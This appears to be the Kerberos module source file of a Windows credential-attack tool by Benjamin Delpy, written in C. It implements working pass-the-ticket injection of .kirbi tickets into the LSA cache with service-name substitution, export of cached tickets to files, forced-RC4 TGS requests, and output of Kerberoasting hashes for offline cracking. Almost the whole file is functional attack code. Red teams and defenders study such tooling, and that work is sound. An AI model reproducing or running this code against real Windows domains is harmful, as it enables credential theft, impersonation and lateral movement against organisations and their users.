/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_kerberos.h"

STRING	kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
DWORD	g_AuthenticationPackageId_Kerberos = 0;
BOOL	g_isAuthPackageKerberos = FALSE;
HANDLE	g_hLSA = NULL;

const KUHL_M_C kuhl_m_c_kerberos[] = {
	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
	{kuhl_m_kerberos_list,		L"list",		L"List ticket(s)"},
	{kuhl_m_kerberos_ask,		L"ask",			L"Ask or get TGS tickets"},
	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
};

const KUHL_M kuhl_m_kerberos = {
	L"kerberos",	L"Kerberos package module",	L"",
	ARRAYSIZE(kuhl_m_c_kerberos), kuhl_m_c_kerberos, kuhl_m_kerberos_init, kuhl_m_kerberos_clean
};

NTSTATUS kuhl_m_kerberos_init()
{
	NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
	if(NT_SUCCESS(status))
	{
		status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
		g_isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_clean()
{
	return LsaDeregisterLogonProcess(g_hLSA);
}

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if(g_hLSA && g_isAuthPackageKerberos)
		status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
{
	int i;
	for(i = 0; i < argc; i++)
	{
		if(PathIsDirectory(argv[i]))
		{
			kprintf(L"* Directory: \'%s\'\n", argv[i]);
			kull_m_file_Find(argv[i], L"*.kirbi", FALSE, 0, FALSE, kuhl_m_kerberos_ptt_directory, NULL);
		}
		else kuhl_m_kerberos_ptt_directory(0, argv[i], PathFindFileName(argv[i]), NULL);
	}
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	PWSTR separator;
	KULL_M_ASN1_PrincipalName pAltService;
	if(fullpath)
	{
		separator = wcschr(fullpath, L'|');
		if(separator && *(separator + 1))
		{
			*separator = L'\0';
			separator++;
			kull_m_kerberos_asn1_PrincipalName_create_fromName(&pAltService, NULL, separator);
		}
		else separator = NULL;

		kprintf(L"\n* File: \'%s\': ", fullpath);
		kuhl_m_kerberos_ptt_file(fullpath, separator ? &pAltService : NULL);
		if(separator)
			kull_m_kerberos_asn1_PrincipalName_delete(&pAltService);
	}
	return FALSE;
}

void kuhl_m_kerberos_ptt_file(PCWCHAR filename, KULL_M_ASN1_PrincipalName *pAltService)
{
	NTSTATUS status;
	KULL_M_ASN1_KRB_CRED *KrbCred = NULL, outKrbCred = {0};
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;
	OssBuf ossTgtBuff = {0, NULL}, ossOutTgtBuff = {0, NULL};
	KULL_M_ASN1_PrincipalName tmp, tmp2;

	if(kull_m_file_readData(filename, &ossTgtBuff.value, (PDWORD) &ossTgtBuff.length))
	{
		if(pAltService)
		{
			kprintf(L"\n");
			if(kull_m_kerberos_asn1_KrbCred_decode(&ossTgtBuff, NULL, &KrbCred, &encKrbCred))
			{
				kprintf(L"\n* Alternative ServiceName: \'");
				kull_m_kerberos_asn1_PrincipalName_descr(pAltService, FALSE);
				kprintf(L"\': ");

				tmp = KrbCred->tickets->value.sname;
				KrbCred->tickets->value.sname = *pAltService;
				
				if(encKrbCred->ticket_info->value.bit_mask & KULL_M_ASN1_KrbCredInfo_sname_present)
				{
					tmp2 = encKrbCred->ticket_info->value.sname;
					encKrbCred->ticket_info->value.sname = *pAltService;
				}

				outKrbCred = *KrbCred;
				outKrbCred.enc_part.cipher.length = 0;
				outKrbCred.enc_part.cipher.value = NULL;

				if(!ossEncode(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred, (OssBuf *) &outKrbCred.enc_part.cipher))
				{
					if(!ossEncode(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, &outKrbCred, &ossOutTgtBuff))
					{
						status = kuhl_m_kerberos_ptt_data(ossOutTgtBuff.value, ossOutTgtBuff.length, NULL);
						ossFreeBuf(&kull_m_kerberos_asn1_world, ossOutTgtBuff.value);
					}
					else PRINT_ERROR(L"Unable to encode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
					ossFreeBuf(&kull_m_kerberos_asn1_world, outKrbCred.enc_part.cipher.value);
				}
				else PRINT_ERROR(L"Unable to encode EncKrbCredPart: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));

				KrbCred->tickets->value.sname = tmp;
				if(encKrbCred->ticket_info->value.bit_mask & KULL_M_ASN1_KrbCredInfo_sname_present)
					encKrbCred->ticket_info->value.sname = tmp2;
				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
			}
		}
		else status = kuhl_m_kerberos_ptt_data(ossTgtBuff.value, ossTgtBuff.length, NULL);

		if(NT_SUCCESS(status))
			kprintf(L"OK\n");
		else
			PRINT_ERROR(L"LsaCallKerberosPackage %08x\n", status);
		LocalFree(ossTgtBuff.value);
	}
	else PRINT_ERROR_AUTO(L"kull_m_file_readData");
}

NTSTATUS CALLBACK kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize, KULL_M_ASN1_PrincipalName *sname)
{
	NTSTATUS status = STATUS_MEMORY_NOT_ALLOCATED, packageStatus;
	DWORD submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;
	
	if(sname)
	{
		kprintf(L" > ");
		kull_m_kerberos_asn1_PrincipalName_descr(sname, FALSE);
		kprintf(L" : ");
	}

	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
	if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
	{
		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
		pKerbSubmit->KerbCredSize = dataSize;
		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
		RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);

		status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
		if(NT_SUCCESS(status))
		{
			status = packageStatus;
			if(!NT_SUCCESS(status))
				PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", status);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

		LocalFree(pKerbSubmit);
	}

	if(NT_SUCCESS(status) && sname)
		kprintf(L"OK!\n");
	return status;
}

NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_PURGE_TKT_CACHE_REQUEST kerbPurgeRequest = {KerbPurgeTicketCacheMessage, {0, 0}, {0, 0, NULL}, {0, 0, NULL}};
	PVOID dumPtr;
	DWORD responseSize;

	status = LsaCallKerberosPackage(&kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &dumPtr, &responseSize, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
			kprintf(L"Ticket(s) purge for current session is OK\n");
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = {KerbQueryTicketCacheExMessage, {0, 0}};
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE pKerbCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData, i;
	OssBuf buf = {0, NULL};
	LPWSTR filename;
	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;

	status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			for(i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
			{
				szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
				if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
				{
					pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
					pKerbRetrieveRequest->CacheOptions = /*KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | */KERB_RETRIEVE_TICKET_AS_KERB_CRED;
					pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
					pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
					pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
					RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);
					status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
					if(NT_SUCCESS(status))
					{
						if(NT_SUCCESS(packageStatus))
						{
							buf.length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
							buf.value = pKerbRetrieveResponse->Ticket.EncodedTicket;
							if(kull_m_kerberos_asn1_KrbCred_decode(&buf, NULL, &KrbCred, &encKrbCred))
							{
								if(kull_m_string_args_byName(argc, argv, L"export", NULL, NULL))
								{
									if(filename = kull_m_kerberos_asn1_KrbCred_filename(KrbCred, L"_LSA", NULL))
									{
										if(status = kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
											kprintf(L"  > Ticket in file \'%s\'\n", filename);
										else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
										LocalFree(filename);
									}
								}
								ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
								ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
							}
							LsaFreeReturnBuffer(pKerbRetrieveResponse);
						}
						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
					}
					else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
					LocalFree(pKerbRetrieveRequest);
				}
				kprintf(L"\n");
			}
			LsaFreeReturnBuffer(pKerbCacheResponse);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	PCWCHAR szTarget;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData;
	USHORT dwTarget;
	OssBuf buf = {0, NULL};
	LPWSTR filename;
	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;

	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
	{
		dwTarget = (USHORT) ((wcslen(szTarget) + 1) * sizeof(wchar_t));

		szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
		if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
		{
			pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
			pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED | (kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL) ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT);
			pKerbRetrieveRequest->EncryptionType = kull_m_string_args_byName(argc, argv, L"rc4", NULL, NULL) ? KERB_ETYPE_RC4_HMAC_NT : kull_m_string_args_byName(argc, argv, L"des", NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L"aes256", NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L"aes128", NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
			pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
			pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
			pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
			RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);
			kprintf(L"Asking for: %wZ\n", &pKerbRetrieveRequest->TargetName);

			status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
			if(NT_SUCCESS(status))
			{
				if(NT_SUCCESS(packageStatus))
				{
					buf.length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
					buf.value = pKerbRetrieveResponse->Ticket.EncodedTicket;
					if(kull_m_kerberos_asn1_KrbCred_decode(&buf, NULL, &KrbCred, &encKrbCred))
					{
						if(kull_m_string_args_byName(argc, argv, L"roast", NULL, NULL))
						{
							kprintf(L"  > Roast:\t");
							if(KrbCred->tickets->value.enc_part.etype == KERB_ETYPE_RC4_HMAC_NT && (KrbCred->tickets->value.enc_part.cipher.length > LM_NTLM_HASH_LENGTH))
							{
								kprintf(L"$krb5tgs$%i$", KrbCred->tickets->value.enc_part.etype);
								kull_m_kerberos_asn1_PrincipalName_descr(&KrbCred->tickets->value.sname, FALSE);
								kprintf(L"$%S$", KrbCred->tickets->value.realm);
								kull_m_kerberos_asn1_PrincipalName_descr(&KrbCred->tickets->value.sname, FALSE);
								kprintf(L"$");
								kull_m_string_wprintf_hex(KrbCred->tickets->value.enc_part.cipher.value, 16, 0);
								kprintf(L"$");
								kull_m_string_wprintf_hex(KrbCred->tickets->value.enc_part.cipher.value + 16, KrbCred->tickets->value.enc_part.cipher.length - 16, 0);
								kprintf(L"\n");
							}
							else PRINT_ERROR(L"Invalide etype or data len\n");
						}
						if(kull_m_string_args_byName(argc, argv, L"export", NULL, NULL))
						{
							if(filename = kull_m_kerberos_asn1_KrbCred_filename(KrbCred, L"_LSA", NULL))
							{
								if(status = kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
									kprintf(L"  > Ticket in file \'%s\'\n", filename);
								else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
								LocalFree(filename);
							}
						}
					}
					LsaFreeReturnBuffer(pKerbRetrieveResponse);
				}
				else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
					PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
			}
			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
			LocalFree(pKerbRetrieveRequest);
		}
	}
	else PRINT_ERROR(L"At least /target argument is required (eg: /target:cifs/server.lab.local)\n");
	return STATUS_SUCCESS;
}
